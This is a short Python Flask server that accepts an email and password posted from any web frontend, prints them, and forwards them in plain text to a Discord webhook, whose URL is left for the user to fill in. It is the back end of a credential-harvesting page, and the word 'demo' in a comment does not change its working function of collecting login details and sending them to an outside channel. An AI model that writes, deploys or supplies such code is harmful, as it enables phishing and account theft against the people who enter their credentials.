from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)  # allows frontend (any port) to connect

@app.route("/send", methods=["POST"])
def send():
    # Get data from request
    data = request.json
    email = data.get("email")
    password = data.get("password")
    
    print("Received data from frontend:")
    print("Email:", email)
    print("Password (demo):", password)
    
    # Send to Discord webhook
    webhook_url = "YOUR_WEBHOOK_URL"  # Replace with your actual webhook URL
    
    webhook_data = {
        "content": f"Email: {email}\nPassword: {password}"
    }
    
    # Post the data to the webhook URL
    webhook_response = requests.post(webhook_url, json=webhook_data)
    
    if webhook_response.status_code == 204:
        print("Message sent to webhook successfully!")
    else:
        print(f"Failed to send to webhook, status code: {webhook_response.status_code}")
    
    # Return response to frontend
    return jsonify({
        "status": "success",
        "message": "Data received successfully!"
    })


if __name__ == "__main__":
    app.run(port=5000, debug=True)
